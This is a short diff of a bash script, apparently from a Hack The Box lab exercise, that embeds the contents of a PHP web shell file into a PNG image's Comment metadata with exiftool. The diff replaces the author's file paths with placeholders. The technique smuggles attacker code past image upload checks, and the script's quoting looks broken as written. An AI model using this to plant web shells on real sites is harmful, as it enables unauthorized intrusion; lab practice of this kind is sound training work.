@@ -1,5 +1,5 @@
 #!/bin/bash
 
-p= $(cat /home/tepidangler/Rshell/shell.php)
+p= $(cat <path-to>shell.php)
 
-/usr/bin/exiftool -Comment=$p;" /home/tepidangler/HTB/Hawk/drupal.png
+/usr/bin/exiftool -Comment=$p;" <path-to-picture>.png
